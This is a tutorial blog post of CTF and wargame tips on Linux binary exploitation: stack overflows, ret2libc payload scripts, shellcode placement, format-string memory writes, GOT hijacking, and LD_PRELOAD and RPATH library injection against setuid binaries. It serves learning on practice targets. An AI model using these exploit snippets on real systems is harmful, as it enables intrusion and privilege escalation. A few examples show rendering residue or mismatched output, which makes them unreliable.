*********************************
CTF Series :  Binary Exploitation
*********************************

This post (Work in Progress) lists the tips and tricks while doing Binary Exploitation challenges during various CTF's and Over The Wire Wargame.

**Thanks to superkojiman, barrebas, et0x who helped me learning the concepts.**

Basics
======

Let's start with some basic concepts and then we would see some examples which would help to clear the concepts.

* Big-endian systems store the most significant byte of a word in the smallest address and the least significant byte is stored in the largest address. Little-endian systems, in contrast, store the least significant byte in the smallest address. {% img left /images/big-endian.png 250 250 %} {% img right /images/little-endian.png 250 250 %}

Initial Checks?
---------------
When you get a binary for exploitation, we need to find whether it is 32-bit or 64-bit ELF, which platform it is running, whether any buffer overflow prevention techniques has been used, what is EIP offset.

Binary Architecture
^^^^^^^^^^^^^^^^^^^
Executable binary is running on whether x86 or x86-64.

::

  uname -a

Whether the binary is compiled for 32 bit or 64 bit.

::

  file binary_file

Binary Help?
^^^^^^^^^^^^

Probably a good idea to just run the binary with -h or --help flag to check if any help documentation is provided.

::

 $ ./flagXX -h
 Usage: php [options] [-f] <file> [--] [args...]
       php [options] -r <code> [--] [args...]


Binary Protection
^^^^^^^^^^^^^^^^^

Multiple Buffer overflow prevention techniques such as RELRO, NoExecute (NX), Stack Canaries, Address Space Layout Randomization (ASLR) and Position Independent Executables (PIE).

::

    Address space Layout Randomization     : Kernel
    Executable Stack Protection            : Compiler
    Stack smashing protection              : Compiler
    Position Independent Executables       : Compiler
    Fortify Source                         : Compiler
    Stack Protector                        : Compiler

* Which buffer overflow prevention techniques are used can be found by running Checksec Script. This script is present in gdb-peda.

* Whether the stack of binary is executable is not can be found by readelf tool. If Program header GNU\_STACK has RWE flag, if it has E flag, it's executable.

 ::

    narnia8@melinda:~$ readelf -l /narnia/narnia8 | grep GNU_STACK
    GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RWE 0x10

 In order to make the stack executable, the program needs to be compiled with -z execstack option and to disable stack smashing option -fno-stack-protector should be used.

 ::

    gcc -ggdb -m32 -fno-stack-protector -z execstack -o buffer1 buffer1.c


* Address Space Layout Randomization (ASLR) controlled by /proc/sys/kernel/randomize\_va\_space.

 ::

    Three Values:
    0  : Disable ASLR. This setting is applied if the kernel is booted with the norandmaps boot parameter.
    1  : Randomize the positions of the stack, virtual dynamic shared object (VDSO) page, and shared memory regions. The base address of the data segment is located immediately after the end of the executable code segment.
    2  : Randomize the positions of the stack, VDSO page, shared memory regions, and the data segment. This is the default setting.

 You can change the setting temporarily by writing a new value to /proc/sys/kernel/randomize\_va\_space, for example:

 ::

    echo value > /proc/sys/kernel/randomize_va_space

 To change the value permanently, add the setting to /etc/sysctl.conf, for example:

 ::

    kernel.randomize_va_space = value
    and run the sysctl -p command.

 If you change the value of randomize_va_space, you should test your application stack to ensure that it is compatible with the new setting. If necessary, you can disable ASLR for a specific program and its child processes by using the following command:

 ::

    % setarch `uname -m` -R program [args ...]

EIP Offsets?
^^^^^^^^^^^^

To know the EIP offset, you can use cyclic patterns. Use pattern_create.rb to create a random pattern which can be used to find the offset and pattern\_offset.rb to find the exact offset.

::

   /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 200
   Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag

   /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x37654136
   [*] Exact match at offset 140



Buffer overflow
===============

Executable Stack
----------------

Either you can put the shellcode on the buffer and then redirect the EIP to NOP Sled followed by the shellcode (provided the shellcode used is correct and the stack is executable).

Non-executable stack, ASLR Disabled
-----------------------------------

However, if the stack is not executable or the shellcode is not working (happens sometimes), then we can either,

Export a environment variable
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

* Export a environment variable with shellcode.
* Find the address of env variable in the stack. Utilize getenvaddr.c to get the address of the environment variable

 .. code-block:: c

  ---getenvaddr.c---

  #include <stdio.h>
  #include <stdlib.h>
  #include <string.h>

  int main(int argc, char *argv[]) {
	 char *ptr;

	 if (argc < 3) {
	 	printf("Usage: %s <environment var> <target program name>\n", argv[0]);
	 	exit(0);
	 } else {
		 ptr = getenv(argv[1]); /* Get environment variable location */
		 ptr += (strlen(argv[0]) - strlen(argv[2])) * 2; /* Adjust for program name */
		 printf("%s will be at %p\n", argv[1], ptr);
 	 }
   }


* Set the return address to starting of the shellcode 
* Get a shell

Return2libc
^^^^^^^^^^^

Use return2libc which is a type of ROP

* Find the address of system function (Run "gdb -q ./program"; break main; p system)

  ::

   gdb -q ./retlib
   (no debugging symbols found)...(gdb)
   (gdb) b main
   Breakpoint 1 at 0x804859e
   (gdb) r
   Starting program: /home/c0ntex/retlib
   (no debugging symbols found)...(no debugging symbols found)...
   Breakpoint 1, 0x0804859e in main ()
   (gdb) p system
   $1 = {<text variable, no debug info>} 0x28085260 <system> 

* Find the address of "/bin/sh" in the stack or export it in the environment variable and execute it like system("/bin/sh"). It is in the format of 

 ::

   <ADDRofSYSTEM> <4ArbitraryBytes for Return Address> <argument for system[/bin/sh]>

  4Arbitrary Bytes for Return address could be a JUNK address or "\xCC\xCC\xCC\xCC" or address of exit function.

If Return Address set to

* \\xCC\\xCC\\xCC\\xCC so after system executes, it tries to return to 0xcccccccc. \\xcc is good just to check if you're actually jumping to your shellcode, but once you've verified that it works, then you should remove it. ret expects an address. not a payload, \xCC\xCC\xCC\xCC should be present as a payload.
* If a JUNK address is put, the binary will have already executed the shellcode but it will segfault.
* If the proper address of exit() is used, binary will exit cleanly.

It's better to use /bin/sh instead of /bin/bash since bash drops privs. If /bin/bash is used, it will launch /bin/bash but you'll find that you haven't elevated your privileges and this can get confusing. so either find another string that points to /bin/sh or set your own env variable like DASH=/bin/sh and reference that. Good paper to review is `Bypassing non-executable-stack during Exploitation (return-to-libc) <https://css.csail.mit.edu/6.858/2017/readings/return-to-libc.pdf>`_ and `Performing a ret2libc Attack <http://shellblade.net/docs/ret2libc.pdf>`_ 


* Sometimes you need to put a cat to keep the shell alive

 ::

    (cat input; cat) | ./binary input is the payload you are sending.

Return-Oriented Programming
^^^^^^^^^^^^^^^^^^^^^^^^^^^

Msfelfscan can be used to locate interesting addresses within executable and linkable format (ELF) programs, which may prove useful in developing exploits.

::

 /usr/share/framework2/msfelfscan -f stack7
  Usage: /usr/share/framework2/msfelfscan <input> <mode> <options>
 Inputs:
         -f  <file>    Read in ELF file
 Modes:
         -j  <reg>     Search for jump equivalent instructions
         -s            Search for pop+pop+ret combinations
         -x  <regex>   Search for regex match
         -a  <address> Show code at specified virtual address
 Options:
         -A  <count>   Number of bytes to show after match
         -B  <count>   Number of bytes to show before match
         -I  address   Specify an alternate base load address
         -n            Print disassembly of matched data

We can use msfelfscan to get pop-pop-retun, choose that address and use

::

 pop-pop-ret-addr | 8 bytes junk | address to execute |

 where address-to-execute is the address of the environment variable where shellcode is stored.


Non-Executable Stack, ASLR Enabled
----------------------------------

If the aslr is enabled, the address for the libc would change everytime, the binary is executed.

::

 for i in `seq 1 5`; do ldd ovrflw | grep libc; done
	libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb762f000)
	libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb758f000)
	libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb75ae000)

However, if we notice the libc address in not changing much, first three characters and last three characters remain the same. Because, the machine we are doing would be probably a CTF machine, so we can brute-force the possible libc address. It is suggested to figure out the offset of system, exit and string "/bin/sh" from the libc base address. Remember,

::

 <ADDRofSYSTEM> <4ArbitraryBytes for Return Address> <argument for system[/bin/sh]>

Find the offset of system, exit and /bin/sh
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

System

::

 readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system
   246: 00113d70    68 FUNC    GLOBAL DEFAULT   13 svcerr_systemerr@@GLIBC_2.0

  2410: 000f54f0     2 FUNC    GLOBAL DEFAULT   13 __cyg_profile_func_exit@@GLIBC_2.2

String /bin/sh

::

 strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh
 15cdc8 /bin/sh

Now, we know the offset of the system, exit and /bin/sh

::

  1461: 0003ab40    55 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.0
   141: 0002e7f0    33 FUNC    GLOBAL DEFAULT   13 exit@@GLIBC_2.0
 15cdc8 /bin/sh

Creation of exploit
^^^^^^^^^^^^^^^^^^^

Now, when we have the offset, let's take a sample libc address and create the exploit

::

 from subprocess import call
 import struct

 #---Offsets of System, Exit and /bin/sh
 libc_base_addr = 0xb75e6000
 system_offset  = 0x00040310
 exit_offset    = 0x00033260
 binsh_offset   = 0x00162bac

 #---Calculation of System, Exit, binsh addr
 system_addr = struct.pack("<I",libc_base_addr + system_offset)
 exit_addr   = struct.pack("<I",libc_base_addr + exit_offset)
 binsh_addr  = struct.pack("<I",libc_base_addr + binsh_offset)

 #---Creating the payload
 buf = "A" * 112
 buf += system_addr
 buf += exit_addr
 buf += binsh_addr


Calling the targetted binary multiple times
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

::

 #---Execution of the binary multiple times
 i = 0;
 while(i<512):
   print "Try :%s" %i
   i = i+1
   ret = call(["/usr/local/bin/ovrflw",buf])

* Sometimes we need a shellcode to write a string or for getting a actual shell. A good reference can be found `Introduction to Writing Shellcode <https://www.exploit-db.com/raw/13224/>`_ Information about various system call integar value need to be present in EAX register is `Linux System Call Table <https://syscalls.kernelgrok.com/>`_ 

 Let's see a small example where we move an address to eax register and jump to it. Address which we are moving to eax would contain our shellcode.

 ::

   ;test.asm
   [SECTION .text]
   global _start
   _start:
           mov eax, 0xffffd8bc
         jmp eax

 Just good to know: global directive is NASM specific. It is for exporting symbols in your code to where it points in the object code generated. Here you mark \_start symbol global so its name is added in the object code (a.o). The linker (ld) can read that symbol in the object code and its value so it knows where to mark as an entry point in the output executable. When you run the executable it starts at where marked as \_start in the code.

 If a global directive missing for a symbol that symbol will not be placed in the object code's export table so linker has no way of knowing about the symbol. We can compile the asm file by 
 ::

   nasm -f elf test.asm

 link it

 ::

   ld -o test test.o

 If you get the below error
 ::

   ld: i386 architecture of input file `test.o' is incompatible with i386:x86-64 output

 either 

 Use 64 bits instead of 32 for your loader and compile it with the following command:
 ::

   nasm -f elf64 loader.asm -o loader.o

 or 

 If want compile the file as 32 bits composition, you can use:

 ::

   ld -m elf_i386 -s -o file.o file

 To see the byte code 
 ::

   objdump -d <file>


* What we mostly do when exploiting a buffer overflow (when placing the shellcode on stack) is we place our shellcode before EIP, we should also check if we can put our shellcode after EIP. This is particularly useful when some kind of check for shellcode is present in address before EIP. Example: Suppose our EIP is present at offset 80. We would usually do

 ::

   python -c 'print "\x90"*50 + "30 Bytes of ShellCode" + "4 Bytes return address to NOP or shellcode in left"'

 However, if somekind of check for alphanumeric characters is present for first 80 bytes you won't be able to put your shellcode in those 80 bytes. At that point of time you should check if you can overflow post EIP and redirect. For example

 ::

    python -c 'print "A"*80 + "4 Bytes return address to NOP or shellcode in right" + "\x90"*50 + "30 Bytes of ShellCode"'


Format String Vulnerability
===========================

Definition
----------

If an attacker is able to provide the format string to an ANSI C format function in part or as a whole, a format string vulnerability is present. By doing so, the behaviour of the format function is changed, and the attacker may get control over the target application. A format string is an ASCIIZ string that contains text and format parameters. Example:

::

  printf ("The magic number is: %d\n", 1911);

Behaviour of the format function
--------------------------------

The behaviour of the format function is controlled by the format string. The function retrieves the parameters requested by the format string from the stack.

::

  printf ("Number %d has no address, number %d has: %08x\n", i, a, &a);

From within the printf function the stack looks like:

::

   stack top 
   . . . 
   <&a> 
   <a> 
   <i>
    A 
   . . .
   stack bottom

Crashing the Program
--------------------

By utilizing format strings we can easily trigger some invalid pointer access by just supplying a format string like: 

::

  printf ("%s%s%s%s%s%s%s%s%s%s%s%s");

Because ‘%s’ displays memory from an address that is supplied on the stack, where a lot of other data is stored, too, our chances are high to read from an illegal address, which is not mapped.


Viewing the stack
-----------------

How some parts of the stack memory by using a format string like this:

::

  printf ("%08x.%08x.%08x.%08x.%08x\n");

This works, because we instruct the printf-function to retrieve five parameters from the stack and display them as 8-digit padded hexadecimal numbers. So a possible output may look like:

::

  40012980.080628c4.bffff7a4.00000005.08059c04

This is a partial dump of the stack memory, starting from the current bottom upward to the top of the stack — assuming the stack grows towards the low addresses.


Viewing Memory at any location
------------------------------

We can look at memory locations different from the stack memory by providing an address to the format string.

Our format string is usually located on the stack itself, so we already have near to full control over the space, where the format string lies. The format function internally maintains a pointer to the stack location of the current format parameter. If we would be able to get this pointer pointing into a memory space we can control, we can supply an address to the ‘%s’ parameter. To modify the stack pointer we can simply use dummy parameters that will ‘dig’ up the stack by printing junk:

::

  printf ("AAA0AAA1_%08x.%08x.%08x.%08x.%08x");

The ‘%08x’ parameters increase the internal stack pointer of the format function towards the top of the stack. After more or less of this increasing parameters the stack pointer points into our memory: the format string itself. The format function always maintains the lowest stack frame, so if our buffer lies on the stack at all, it lies above the current stack pointer for sure. If we choose the number of ‘%08x’ parameters correctly, we could just display memory from an arbitrary address, by appending ‘%s’ to our string. In our case the address is illegal and would be ‘AAA0’. Lets replace it with a real one. Example:

::

  address = 0x08480110
  address (encoded as 32 bit le string): "\x10\x01\x48\x08" 
  printf ("\x10\x01\x48\x08_%08x.%08x.%08x.%08x.%08x|%s|");

Will dump memory from 0x08480110 until a NUL byte is reached. If we cannot reach the exact format string boundary by using 4-Byte pops (‘%08x’), we have to pad the format string, by prepending one, two or three junk characters. 3 This is analog to the alignment in buffer overflow exploits.


Overwriting of Arbitrary Memory
-------------------------------

There is the ‘%n’ parameter, which writes the number of bytes already printed, into a variable of our choice. The address of the variable is given to the format function by placing an integer pointer as parameter onto the stack. But if we supply a correct mapped and writeable address this works and we overwrite four bytes (sizeof (int)) at the address: 

::

  "\xc0\xc8\xff\xbf_%08x.%08x.%08x.%08x.%08x.%n"

The format string above will overwrite four bytes at 0xbfffc8c0 with a small integer number. We have reached one of our goals: we can write to arbitrary addresses. By using a dummy parameter ‘%nu’ we are able to control the counter written by ‘%n’, at least a bit.

Direct Parameter Access
^^^^^^^^^^^^^^^^^^^^^^^

The direct parameter access is controlled by the ‘$' qualifier

::
 
  printf ("%6`\ d:raw-latex:`\n`", 6, 5, 4,3, 2, 1);

Prints ‘1’, because the ‘6$’ explicitly addresses the 6th parameter on the stack.

The above text is taken from and a good paper to read for format string is `Exploiting Format String Vulnerabilities`_

 .. _Exploiting Format String Vulnerabilities: http://www.cis.syr.edu/~wedu/seed/Labs/Vulnerability/Format_String/files/formatstring-1.2.pdf

Write two bytes
^^^^^^^^^^^^^^^
We can write two bytes by %hn and one byte by %hhn.

Write four bytes
^^^^^^^^^^^^^^^^

How to write four bytes? Suppose we need to write 0x8048706 to the address 0xffffd64c.

::

  HOB:0x0804 LOB:0x8706

  If HOB < LOB

  [addr+2][addr] = \x4e\xd\xff\xff\x4c\xd\xff\xff
  %.[HOB - 8]x = 0x804 - 8 = 7FC (2044) = %.2044x
  %[offset]$hn = %6\$hn 
  %.[LOB - HOB]x = 0x8706 - 0x804 = 7F02 (32514) = %.32514x 
  %[offset+1]`\ hn = %7$hn

  python -c 'print "\x4e\xd6\xff\xff\x4c\xd6\xff\xff" +"%.2044x%6\$hn %.32514x%7\$hn"'

Hijack the Global Offset Table with pointers
--------------------------------------------

**Definition** 

The Global Offset Table redirects position independent address calculations to an absolute location and is located in the .got section of an ELF executable or shared object. It stores the final (absolute) location of a function calls symbol, used in dynamically linked code. When a program requests to use printf() for instance, after the rtld locates the symbol, the location is then relocated in the GOT and allows for the executable via the Procedure Linkage Table, to directly access the symbols location.

When you disassemble main and printf statement is present, you will get like        

::

    0x080484b9 <+60>: call 0x8048330 printf@plt <----PLT

if you further disassemble printf

::
   
    gdb-peda$ pdisass printf 
    Dump of assembler code for function printf@plt:
        0x08048330 <+0>: jmp DWORD PTR ds:0x8049788 <----GOT Address 
        0x08048336 <+6>: push 0x0 
        0x0804833b <+11>: jmp 0x8048320 End of assembler dump.

Further disassembling the address 0x8049788
  
::

   gdb-peda$ pdisass 0x8049788
   Dump of assembler code from 0x8049788 to 0x80497a8:
     0x08049788 <printf@got.plt+0>:   add    DWORD PTR ss:[eax+ecx*1],0x46
     0x0804978d <fgets@got.plt+1>:    add    DWORD PTR [eax+ecx*1],0x56
     0x08049791 <puts@got.plt+1>: add    DWORD PTR [eax+ecx*1],0x66
     0x08049795 <__gmon_start__@got.plt+1>:   add    DWORD PTR [eax+ecx*1],0x76
     0x08049799 <__libc_start_main@got.plt+1>:    add    DWORD PTR [eax+ecx*1],0x0
     0x0804979d <data_start+1>:   add    BYTE PTR [eax],al
     0x0804979f <data_start+3>:   add    BYTE PTR [eax],al
     0x080497a1 <__dso_handle+1>: add    BYTE PTR [eax],al
     0x080497a3 <__dso_handle+3>: add    BYTE PTR [eax],al
     0x080497a5 <stdin@@GLIBC_2.0+1>: add    BYTE PTR [eax],al
     0x080497a7 <stdin@@GLIBC_2.0+3>: add    BYTE PTR [eax],al
   End of assembler dump. 

Objdump reflects the same (notice the +1) GOT address:

::
    
    objdump --dynamic-reloc ./behemoth3 

    ./behemoth3:     file format elf32-i386

Tips and Tricks
===============

* Probably, sometimes, we have to use `Socket re-use shellcode <https://www.exploit-db.com/exploits/34060/>`_ 
* To attach to a network process in gdb, you might have to use

 ::

  gdb-peda$ set follow-fork-mode child

* If the parent is killed, children become children of the init process (that has the process id 1 and is launched as the first user process by the kernel). The init process checks periodically for new children, and kills them if they have exited (thus freeing resources that are allocated by their return value).

Appendix-I GDB Basics
=====================

Getting inputs
--------------

Taken from `Managing inputs for payload injection? <https://reverseengineering.stackexchange.com/questions/13928/managing-inputs-for-payload-injection>`_

Getting inputs from char \*argv[]
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
We can read the arguments from the initial command line

::
 
 $> ./program $(python -c 'print("\xef\xbe\xad\xde")')

In gdb, we can pass the arguments through the run command line:

::

 (gdb) run $(python -c 'print("\xef\xbe\xad\xde")')

Getting inputs from a file
^^^^^^^^^^^^^^^^^^^^^^^^^^

We can also provide input from file

::

 $> ./program ./myfile.txt

And, within gdb

::

 (gdb) run myfile.txt

Then, outside of gdb you can rewrite the content of the file and run your program again and again in gdb.

Getting inputs from stdin
^^^^^^^^^^^^^^^^^^^^^^^^^
Getting the input through stdin can be achieve through a wide variety of functions such as fgets(), scanf(), getline(), read() and others. It raises a few problems because the program stop while executing and wait to be fed with characters.

In case you have to deal with several inputs (eg login, password, ...), you need to use separators between the inputs. Usually the separator between each input is just a newline character (\n or \r depending on the system you are in).

Now, you have two ways of doing to feed the stdin. Either we pass the file

::

 $> cat ./mycommands.txt | ./program
 
The stdin requires to run the command either through a file

::

 (gdb) run < ./mycommands.txt

And do as said in the previous case.

The other option is to pipe the output of a command to the stdin of the program

::

 $> python -c 'print("\xef\xbe\xad\xde")' | ./program

In gdb we can use the bash process substitution <(cmd) trick:

::

 (gdb) run < <(python -c 'print("\xef\xbe\xad\xde")')

This way is much quicker than effectively creating a named pipe and branch your program on it. Creating the named pipe outside of gdb requires a lot of unnecessary steps where you have it instantly with the previous technique.

Note also that, some people are using <<$(cmd) like this:

::

 (gdb) run <<< $(python -c 'print("\xef\xbe\xad\xde")')

But, this last technique seems to filter out all NULL bytes (for whatever reason), so you should prefer the first one (especially if you want to pass NULL bytes).

Getting inputs from network
^^^^^^^^^^^^^^^^^^^^^^^^^^^

We can use netcat nc. Basically, if your vulnerable program is listening on localhost:666 then the command line would be:

::

 $> python -c 'print("\xef\xbe\xad\xde")' | nc -vv localhost 666

Within gdb, the point will be to run (r) the program and to connect to it from another terminal.

Keep the stdin open after injection
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Most of the techniques for stdin will send the exploit string to the program which will end shortly after the termination of the input. This mainly happens in gets buffer overflow, so, the stdin should be closed and reopened. The best way to keep it open afterward and get an active shell is to add a cat waiting for input on its stdin. It should look like this if you go though a file:

::

 $> (cat ./mycommands.txt; cat) | ./program

Or, if you want a shell command:

::

 $> (python -c 'print("\xef\xbe\xad\xde")'; cat) | ./program

Or, finally, if you are going through the network:

::

 $> (python -c 'print("\xef\xbe\xad\xde")'; cat) | nc -vv localhost 666

Examining Data
--------------

Examining functions
^^^^^^^^^^^^^^^^^^^

info functions command : Dislays the list of functions in the debugged program

::

 gdb-peda$ info functions 
 All defined functions:

 Non-debugging symbols:
 0x00000000000005a0  _init
 0x00000000000005d0  setresgid@plt

 0x0000000000000834  _fini

Run it before running the program, otherwise all linked functions would also be shown.


Examining Memory
^^^^^^^^^^^^^^^^
We can use the command x (for "examine") to examine memory in any of several formats, independently of your program's data types.

::

 x/nfu addr
 x addr
 x
 
Use the x command to examine memory.

n, f, and u are all optional parameters that specify how much memory to display and how to format it; addr is an expression giving the address where you want to start displaying memory.

* n, the repeat count : The repeat count is a decimal integer; the default is 1. It specifies how much memory (counting by units u) to display.
* f, the display format : The display format is one of the formats used by print, 's' (null-terminated string), or 'i' (machine instruction). The default is 'x' (hexadecimal) initially. The default changes each time you use either x or print.
* u, the unit size : The unit size is any of

 * b Bytes.
 * h Halfwords (two bytes).
 * w Words (four bytes). This is the initial default.
 * g Giant words (eight bytes).

Examining Data
^^^^^^^^^^^^^^

Sometimes, you need to know the address of the variable, inorder to write arbitary value in to it. 
   
:: 

   run gdb <program> p &<variablename>

Find the address of a string using GDB?
  
::

   (gdb) info proc map
   process 930
   Mapped address spaces:

      Start Addr           End Addr       Size     Offset objfile
        0x400000           0x401000     0x1000        0x0 /myapp

    (gdb) find 0x7ffff7a1c000,0x7ffff7bd2000,"/bin/sh"
    0x7ffff7b98489

Examining Registers
^^^^^^^^^^^^^^^^^^^

We can refer to machine register contents, in expressions, as variables with names starting with '$'. The names of registers are different for each machine; use info registers to see the names used on your machine.

* info registers : Print the names and values of all registers except floating-point registers (in the selected stack frame).
* info all-registers : Print the names and values of all registers, including floating-point registers.
* info registers regname ... : Print the relativized value of each specified register regname. As discussed in detail below, register values are normally relative to the selected stack frame. regname may be any register name valid on the machine you are using, with or without the initial '$'.

Appendix-II LD_PRELOAD
======================

Hijacking Functions
-------------------

Let's say there's a function getrand which generates a random path for the files to be stored

::

 int getrand(char **path)
 {
  char *tmp;
  int pid;
  int fd;
 
  srandom(time(NULL));
 
  tmp = getenv("TEMP");
  pid = getpid();
  
  asprintf(path, "%s/%d.%c%c%c%c%c%c", tmp, pid, 
    'A' + (random() % 26), '0' + (random() % 10), 
    'a' + (random() % 26), 'A' + (random() % 26),
    '0' + (random() % 10), 'a' + (random() % 26));
 
  fd = open(*path, O_CREAT|O_RDWR, 0600);
  unlink(*path);
  return fd;
 }

If we see the above function, getpid figures out the PID of the program, unlink deletes the file and random provides a random number. 

We also need to check if the binary is dynamically linked or not?

::

 file /home/flagXX/flagXX
 /home/flagXX/flagXX: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.15, not stripped

If so, then we can create a c file to override the functions we want – random(), unlink() and getpid():

::

 hacking_randomfile.c

 // Take control of random
 int random(){
    return 0;
 }

 // Stop the file being deleted
 int unlink(const char *pathname) {
    return 0;
 }

 // Take control of the reported PID
 int getpid() {
    return 1;
 }


Now, we need to compile this with

::

 gcc hacking_randomfile.c -o hacking_randomfile -shared -fPIC

Using gcc we've specified the normal input file (hacking_randomfile.c) and output file (-o hacking_randomfile), but we've also specified two additional options: 

::

 -shared to make a library and 
 -fPIC to specify Position Independent Code, which is necessary for making a shared library.

Now that we've built hacking_randomfile as a shared library, here's the basic usage:

::

 $ LD_PRELOAD="$PWD/hacking_randomtime" ./main_targetfile


SANS has written a blog about `Go To The Head Of The Class: LD_PRELOAD For The Win <https://pen-testing.sans.org/blog/2017/12/06/go-to-the-head-of-the-class-ld-preload-for-the-win>`_ 

Important things to note
^^^^^^^^^^^^^^^^^^^^^^^^

* Function definition should be correct
* Funtion input and return type should also be correct.

Controlling uninitialized memory with LD_PRELOAD
------------------------------------------------

Dan Rosenberg has documented this technique at `Controlling uninitialized memory with LD_PRELOAD <http://vulnfactory.org/blog/2010/04/08/controlling-uninitialized-memory-with-ld_preload/>`_ The below stuff is directly taken from the blog post.

A local Linux user can exercise a degree of control over uninitialized memory on the stack when executing a program. This happens because of the way the Linux linker/loader, ld.so, handles the LD_PRELOAD environment variable. This variable allows users to specify libraries to be preloaded, effectively allowing users to override functions used in a particular binary. However, regardless of whether or not libraries specified via LD_PRELOAD are actually loaded at runtime, ld.so copies the name of each library onto the stack prior to executing the program, and doesn’t clean up after itself. By specifying a very long LD_PRELOAD variable and executing a binary, a portion of the stack will be overwritten with part of the LD_PRELOAD variable during linking, and it will stay that way once execution of the program begins, even on setuid binaries, where the library itself is not loaded.

This means we can initialise the memory to something under out control:

::

 $ export LD_PRELOAD=`python -c 'print "/bin/getflag\x0a"*1000'`

i.e. fill the stack with one thousand /bin/getflags.

Then when we run flagXX with length of 1, it will almost certainly have this in the buffer already:

::

 $ echo -ne "Content-Length: 1\n " | /home/flagXX/flagXX
 sh: !getflag: command not found
 getflag is executing on a non-flag account, this doesn't count
 getflag is executing on a non-flag account, this doesn't count
 getflag is executing on a non-flag account, this doesn't count
 ... lots of repeats ...
 sh: line 74: /bin/getfl=qm: No such file or directory

Of course, the LD_PRELOAD variable is ignored with setuid binaries, since otherwise an attacker could trivially override arbitrary functions in setuid binaries and easily take control of a system.

LIBC - Rpath
------------

If there's exist a suid binary with a RPATH defined which we control, we can get code execution. Let's first read what's rpath?

RPATH
^^^^^

`rpath <https://en.wikipedia.org/wiki/Rpath>`_ designates the run-time search path hard-coded in an executable file or library. Dynamic linking loaders use the rpath to find required libraries. Specifically it encodes a path to shared libraries into the header of an executable (or another shared library). This RPATH header value (so named in the Executable and Linkable Format header standards) may either override or supplement the system default dynamic linking search paths.

Libraries loaded from the run-time path defined by RPATH wont disable the setuid execution as LDPRELOAD would do. So we can inject our own libc.so.6 (Using version GLIBC2.0 as required by the binary) in the RPATH directory and hook any of the used functions to execute our setuid shell.

We can use readelf to check the dynamic section of a binary

::

 readelf -d flagXX

 Dynamic section at offset 0xf20 contains 21 entries:
  Tag        Type                         Name/Value
 0x00000001 (NEEDED)                     Shared library: [libc.so.6]
 0x0000000f (RPATH)                      Library rpath: [/var/tmp/flagXX]
 0x0000000c (INIT)                       0x80482c0

In the above example, we can see that RPATH is defined as /var/tmp/flagXX, so the binary tries to load the libc.so.6 from that location.


Let's see what are the functions the binary utilizes from libc

::

 objdump -R flag15

 flag15:     file format elf32-i386

 DYNAMIC RELOCATION RECORDS
 OFFSET   TYPE              VALUE
 08049ff0 R_386_GLOB_DAT    __gmon_start__
 0804a000 R_386_JUMP_SLOT   puts
 0804a004 R_386_JUMP_SLOT   __gmon_start__
 0804a008 R_386_JUMP_SLOT   __libc_start_main

libc_start_main
^^^^^^^^^^^^^^^

From `linuxbase <http://refspecs.linuxbase.org/LSB_3.1.1/LSB-Core-generic/LSB-Core-generic/baselib---libc-start-main-.html>`_ The _libcstart_main() function shall perform any necessary initialization of the execution environment, call the main function with appropriate arguments, and handle the return from main(). If the main() function returns, the return value shall be passed to the exit() function.

::

 int __libc_start_main(int (*main) (int, char * *, char * *), int argc, char * * ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end));

gmon_start
^^^^^^^^^^

The function call_gmon_start initializes the gmon profiling system. This system is enabled when binaries are compiled with the -pg flag, and creates output for use with gprof(1). In the case of the scenario binary call_gmon_start is situated directly proceeding that _start function. The call_gmon_start function finds the last entry in the Global Offset Table (also known as __gmon_start__) and, if not NULL, will pass control to the specified address. The __gmon_start__ element points to the gmon initialization function, which starts the recording of profiling information and registers a cleanup function with atexit(). In our case however gmon is not in use, and as such __gmon_start__ is NULL.


Version Reference
^^^^^^^^^^^^^^^^^

GLib provides version information, primarily useful in configure checks for builds that have a configure script.

Check glib version in binary

::

 objdump -p flag15 

 flag15:     file format elf32-i386

 Version References:
  required from libc.so.6:
    0x0d696910 0x00 02 GLIBC_2.0

or 

::

 objdump -T flag15 

 flag15:     file format elf32-i386

 DYNAMIC SYMBOL TABLE:

 080484cc g    DO .rodata	00000004  Base        _IO_stdin_used

Check glib version in your linux machine

::

 ldd --version
 ldd (Debian GLIBC 2.26-2) 2.26

If you get error like "no version information available", create a file version.ld with the version required.

::

 cat version.ld
 GLIBC_2.0 {
 };

and link it while compiling

::

 gcc -shared -static-libgcc -fPIC -Wl,--version-script=version.ld,-Bstatic shell.c -o libc.so.6

LD_DEBUG environment variable
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

If the LD_DEBUG variable is set then the Linux dynamic linker will dump debug information which can be used to resolve most loading problems very quickly. To see the available options just run any program with the variable set to help, i.e.:

::

 LD_DEBUG=help cat
 Valid options for the LD_DEBUG environment variable are:

  libs        display library search paths
  reloc       display relocation processing
  files       display progress for input file
  symbols     display symbol table processing
  bindings    display information about symbol binding
  versions    display version dependencies
  all         all previous options combined
  statistics  display relocation statistics
  unused      determined unused DSOs
  help        display this help message and exit

If you want to debug a binary

::

 LD_DEBUG all ./flagXX

 D_DEBUG=all ./flag15
      4796:
      4796:	file=libc.so.6 [0];  needed by ./flag15 [0]

ulimit
------

ulimit
User limits - limit the use of system-wide resources.

::

 Syntax
